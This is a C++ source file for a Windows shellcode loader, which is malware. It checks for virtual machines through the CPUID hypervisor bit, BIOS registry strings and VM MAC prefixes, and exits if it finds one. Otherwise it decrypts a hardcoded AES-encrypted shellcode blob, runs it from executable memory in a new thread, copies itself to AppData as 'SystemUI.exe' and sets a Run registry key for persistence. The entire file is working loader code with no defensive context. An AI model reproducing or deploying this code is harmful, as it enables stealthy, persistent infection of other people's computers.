#include <windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <vector>
#pragma comment(lib, "iphlpapi.lib")


#include <shlobj.h>  // For SHGetFolderPathA
#include <fstream>

#include <iomanip>    // For std::hex, std::setfill, std::setw
#include <stdexcept>  // For std::runtime_error
#include <algorithm>  // For std::min
#include <cstring>    // For memcpy
#include <sstream>    // For std::stringstream
#include "Headers/aes.h" // tiny-AES-c header





// --- PKCS#7 Unpadding Function ---
// Function to remove PKCS#7 padding
std::vector<uint8_t> remove_pkcs7_padding(const std::vector<uint8_t>& padded_data) {
    if (padded_data.empty()) {
        return {};
    }

    uint8_t padding_value = padded_data.back();
    if (padding_value == 0 || padding_value > padded_data.size()) {
        // Invalid padding value or padding length exceeds data size
        throw std::runtime_error("Invalid PKCS#7 padding.");
    }

    // Check if all padding bytes have the correct value
    for (size_t i = 0; i < padding_value; ++i) {
        if (padded_data[padded_data.size() - 1 - i] != padding_value) {
            throw std::runtime_error("Invalid PKCS#7 padding (byte mismatch).");
        }
    }

    // Return a new vector without the padding
    return std::vector<uint8_t>(padded_data.begin(), padded_data.end() - padding_value);
}

// Helper to print bytes in hexadecimal
void print_hex(const std::vector<uint8_t>& data, const std::string& label = "") {
    if (!label.empty()) {
        std::cout << label << ": ";
    }
    std::cout << std::hex << std::setfill('0');
    for (uint8_t b : data) {
        std::cout << std::setw(2) << static_cast<int>(b);
    }
    std::cout << std::dec << std::endl; // Reset to decimal for general output
}


//--------------------------------------------------------------------------------------------------------------------------------

void add_to_registry(const std::string &exe_path) {
    HKEY hKey;
    LONG result = RegOpenKey(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);

        if (result == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "SystemUI", 0, REG_SZ,
            reinterpret_cast<const BYTE *>(exe_path.c_str()),
            static_cast<DWORD>((exe_path.size() + 1) * sizeof(char)));
        RegCloseKey(hKey);
    }

}


bool copy_to_appdata(std::string &destination_path) {
    char appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
        destination_path = std::string(appdata) + "\\SystemUI.exe";
        std::cout<<destination_path+"\n";
        char current_path[MAX_PATH];
        GetModuleFileNameA(NULL, current_path, MAX_PATH);
        std::cout<<current_path;

        // Copy current exe to destination
        if (CopyFileA(current_path, destination_path.c_str(), FALSE)) {
            return true;
        }
    }
    return false;
}

//---------------------------------------------------------------------------------------------------------------------------------------------


bool checkHypervisor() {
    int cpuInfo[4] = {0};
    __asm__ __volatile__ (
        "cpuid"
        : "=a"(cpuInfo[0]), "=b"(cpuInfo[1]), "=c"(cpuInfo[2]), "=d"(cpuInfo[3])
        : "a"(1)
    );

    return (cpuInfo[2] >> 31) & 1; // ECX bit 31 = hypervisor present
}


// --- BIOS vendor check via registry ---
bool checkRegistryForVM() {
    HKEY hKey;
    const char* keyPath = "HARDWARE\\DESCRIPTION\\System";
    const char* valueName = "SystemBiosVersion";
    char data[256];
    DWORD dataSize = sizeof(data);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;

    bool found = false;
    if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)data, &dataSize) == ERROR_SUCCESS) {
        std::string bios(data);
        if (bios.find("VBOX") != std::string::npos || bios.find("VMWARE") != std::string::npos)
            found = true;
    }

    RegCloseKey(hKey);
 
    return found;
}

// --- MAC address check ---
bool checkMACForVM() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufLen = sizeof(adapterInfo);

    if (GetAdaptersInfo(adapterInfo, &bufLen) != ERROR_SUCCESS)
        return false;

    PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;

    while (pAdapterInfo) {
        BYTE* mac = pAdapterInfo->Address;

        // Common VM MAC prefixes
        const std::vector<std::vector<BYTE>> vmMACs = {
            {0x00, 0x05, 0x69}, // VMware
            {0x00, 0x0C, 0x29}, // VMware
            {0x00, 0x1C, 0x14}, // VMware
            {0x00, 0x50, 0x56}, // VMware
            {0x08, 0x00, 0x27}, // VirtualBox
        };

        for (const auto& prefix : vmMACs) {
            if (memcmp(mac, prefix.data(), 3) == 0)
                return true;
        }

        pAdapterInfo = pAdapterInfo->Next;
    }
 
      return false;
}

// --- Combined logic ---
bool isVMEnvironment() {
    int score = 0;
    if (checkHypervisor()) score++;
    if (checkRegistryForVM()) score++;
    if (checkMACForVM()) score++;

    return score >= 2;
}
//-------------------------------------------------------------------------------------------------------------------------
// --- Example usage ---
int main() {
    if (isVMEnvironment()) {

        ExitProcess(0);
    }



    std::string targetPath;
    // Hardcoded AES key (MUST match the key used for encryption)
    uint8_t key[] = {
        0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    }; // AES128 key (16 bytes)

    // Hardcoded Initialization Vector (IV) (MUST match the IV used for encryption)
    uint8_t iv[] = {
        0x01, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0A
    };

    // Replace this with YOUR ENCRYPTED SHELLCODE from the previous run.
    // This is an example placeholder. Make sure it matches the padded length from encryption.
    // Example: If your original shellcode was 65 bytes, and it was padded to 80 bytes for encryption,
    // this encrypted_shellcode_data should be 80 bytes long.
    unsigned char encrypted_shellcode_data[] = {
0x10, 0x12, 0x28, 0x5c, 0x96, 0xed, 0x0b, 0x74, 0xeb, 0xfd, 0x83, 0xd9, 0xd7, 0x60, 0xb8, 0xfa, 
    0x85, 0x54, 0xd6, 0x03, 0xf7, 0x15, 0xff, 0x64, 0x3a, 0xd2, 0x36, 0xde, 0x50, 0x11, 0xdc, 0xa7, 
    0x78, 0x8f, 0xa3, 0x17, 0x6e, 0x63, 0x41, 0x7b, 0xf0, 0xe6, 0x63, 0x79, 0x7d, 0x39, 0xd1, 0xaf, 
    0x8b, 0x60, 0x99, 0x2e, 0x04, 0x19, 0xc6, 0x15, 0x26, 0x37, 0x00, 0x98, 0x2e, 0xd7, 0xeb, 0xb9, 
    0xd2, 0xef, 0xf5, 0x69, 0x0b, 0xbe, 0x70, 0xde, 0xab, 0xc7, 0x3c, 0x58, 0x16, 0x88, 0x4d, 0x45, 
    0x9a, 0xdd, 0x1d, 0x9d, 0xb6, 0xc2, 0x6f, 0x80, 0xa6, 0x13, 0xda, 0x80, 0x05, 0x89, 0xb3, 0xbd, 
    0x55, 0xdb, 0xcd, 0x22, 0x1c, 0xf9, 0x86, 0x43, 0x67, 0x08, 0x3c, 0x81, 0xb5, 0xb2, 0xec, 0x87, 
    0x4a, 0xa2, 0xa8, 0x82, 0x91, 0xaf, 0x1e, 0x22, 0x3e, 0x5d, 0x3c, 0xa8, 0xb5, 0x64, 0x45, 0x46, 
    0x4d, 0xf2, 0x6c, 0xd9, 0xcc, 0xac, 0x87, 0x9d, 0xb6, 0x48, 0x01, 0x32, 0x05, 0x28, 0x31, 0xbe, 
    0x72, 0xab, 0x72, 0x87, 0x9b, 0x3c, 0x68, 0xc5, 0x00, 0x66, 0xc9, 0xf3, 0xf1, 0x81, 0x31, 0x8f, 
    0x78, 0x51, 0x57, 0x91, 0xf0, 0x17, 0xf3, 0x41, 0xdc, 0x88, 0xd3, 0x5b, 0x44, 0x08, 0xfd, 0x90, 
    0x39, 0x95, 0x79, 0x52, 0xa7, 0x2e, 0x5b, 0xcc, 0x09, 0x0e, 0xc7, 0xbd, 0x96, 0x19, 0x26, 0x59, 
    0x4e, 0x7a, 0xd3, 0xa1, 0x0b, 0x91, 0x17, 0x92, 0x35, 0xd2, 0x13, 0xcd, 0xd0, 0xab, 0x19, 0x4b, 
    0xc9, 0xd1, 0x41, 0xf9, 0x0c, 0xf1, 0xbb, 0xd1, 0x52, 0x22, 0x7e, 0x6c, 0xfd, 0x00, 0xe7, 0x15, 
    0x07, 0x7e, 0x08, 0x5b, 0x23, 0xb0, 0xfb, 0x3a, 0xb4, 0x6c, 0xe9, 0x17, 0xda, 0xcb, 0xf6, 0xf1, 
    0xa2, 0xaf, 0xbf, 0x1e, 0x59, 0x9b, 0x65, 0x21, 0x0c, 0xba, 0x4b, 0x48, 0x9d, 0x7d, 0xe7, 0xff, 
    0x3a, 0xba, 0xf4, 0x39, 0xe1, 0x58, 0x5f, 0x12, 0x6f, 0x01, 0x6e, 0x38, 0x6c, 0xc0, 0x8c, 0x3a, 
    0xf5, 0x24, 0x8d, 0x08, 0x3a, 0x3d, 0xd8, 0xb9, 0xa5, 0x06, 0xcf, 0x65, 0x37, 0xb6, 0xdc, 0x7b, 
    0x47, 0xd6, 0x5e, 0xcf, 0xfe, 0x5e, 0x69, 0x32, 0xaa, 0x3e, 0x7e, 0x92, 0x38, 0xc4, 0x04, 0xe3, 
    0x5f, 0x4d, 0xae, 0xac, 0xfc, 0xd1, 0xf9, 0x46, 0x2d, 0x75, 0xd5, 0x29, 0x53, 0xad, 0xc6, 0xed, 
    0x52, 0x67, 0x13, 0xa6, 0xdd, 0x6b, 0x8b, 0x2a, 0x38, 0x7d, 0xdd, 0x0a, 0x29, 0xce, 0xe0, 0x0d, 
    0xe2, 0x33, 0x1a, 0x8b, 0x32, 0xbd, 0xc9, 0xec, 0xa4, 0x04, 0x35, 0x50, 0xe7, 0xba, 0xf4, 0xcb, 
    0xb1, 0x5f, 0x17, 0x39, 0xf8, 0x7c, 0xd9, 0xa5, 0x34, 0x21, 0xc8, 0x55, 0x3b, 0xf1, 0x36, 0xd2, 
    0xff, 0x40, 0xcb, 0x38, 0xb1, 0x4c, 0x40, 0x01, 0x7e, 0x22, 0xf3, 0x45, 0xaa, 0xc3, 0x50, 0xc6, 
    0xa0, 0xa8, 0xd7, 0xc8, 0x9a, 0x0e, 0x31, 0x9f, 0xdb, 0xe7, 0x9d, 0x02, 0xef, 0x4e, 0xb9, 0x1f, 
    0xfb, 0x53, 0xcb, 0xbc, 0xe8, 0x06, 0x56, 0x73, 0x70, 0xda, 0x70, 0x91, 0x16, 0xd2, 0xba, 0x8f, 
    0xa2, 0x05, 0x5b, 0x57, 0x2a, 0x53, 0x56, 0x6b, 0x3c, 0x3b, 0x45, 0xdd, 0x1b, 0x2c, 0xfe, 0x46, 
    0xbf, 0x1b, 0xdc, 0xcf, 0x9c, 0xa4, 0x8b, 0xaf, 0x0d, 0xb6, 0x52, 0x5d, 0xd9, 0x1f, 0xeb, 0xc8, 
    0x69, 0x0e, 0xa4, 0x92, 0x49, 0x00, 0x78, 0x47, 0x3d, 0x3c, 0x9d, 0x9d, 0xed, 0x7a, 0xa1, 0x13
    };


    // Convert the hardcoded C-style array to std::vector<uint8_t> for easier use
    std::vector<uint8_t> ciphertext_bytes(
        encrypted_shellcode_data,
        encrypted_shellcode_data + sizeof(encrypted_shellcode_data) / sizeof(encrypted_shellcode_data[0])
    );


    // Prepare buffer for decrypted bytes
    std::vector<uint8_t> decrypted_bytes(ciphertext_bytes.size());
    std::vector<uint8_t> recovered_shellcode_bytes;

    // Context for AES operation
    struct AES_ctx ctx;

    // --- Decryption ---
    try {
        // Initialize AES context with the key
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer for decryption
        uint8_t current_iv_decrypt[AES_BLOCKLEN];
        memcpy(current_iv_decrypt, iv, AES_BLOCKLEN);

        // Set the IV for decryption
        AES_ctx_set_iv(&ctx, current_iv_decrypt);

        // Decrypt the ciphertext buffer
        // Note: AES_CBC_decrypt_buffer modifies the input buffer in-place
        std::vector<uint8_t> decrypt_temp_buffer = ciphertext_bytes; // Work on a copy
        AES_CBC_decrypt_buffer(&ctx, decrypt_temp_buffer.data(), decrypt_temp_buffer.size());

        // Copy decrypted data
        std::copy(decrypt_temp_buffer.begin(), decrypt_temp_buffer.end(), decrypted_bytes.begin());

        print_hex(decrypted_bytes, "\nDecrypted (padded) hex");

        // Remove PKCS#7 padding from the decrypted data
        recovered_shellcode_bytes = remove_pkcs7_padding(decrypted_bytes);
        std::cout << "Recovered Shellcode Length (unpadded): " << recovered_shellcode_bytes.size() << " bytes" << std::endl;
        print_hex(recovered_shellcode_bytes, "Recovered Shellcode (hex)");

        // In a real loader, you would now take `recovered_shellcode_bytes`
        // and prepare it for execution (e.g., allocate executable memory, copy bytes, execute).


    } catch (const std::exception& e) {
        std::cerr << "Decryption Error: " << e.what() << std::endl;
        return 1;
    }
    std::cout << "Allocating memory...\n";

// Allocate executable memory using the actual size of the shellcode bytes
LPVOID exec = VirtualAlloc(
    NULL, 
    recovered_shellcode_bytes.size(), 
    MEM_COMMIT | MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE
);

if (exec == NULL) {
 
    return 1;
}

// Copy shellcode bytes into allocated memory
memcpy(exec, recovered_shellcode_bytes.data(), recovered_shellcode_bytes.size());

HANDLE hThread = CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)exec,
    NULL,
    0,
    NULL
);

if (hThread) {
    if(copy_to_appdata(targetPath)){
        add_to_registry(targetPath);

    }
    WaitForSingleObject(hThread, INFINITE);
} 
   

    // Close handle to thread

    CloseHandle(hThread);

    // Free allocated memory

   VirtualFree(exec, 0, MEM_RELEASE);


    return 0;
}
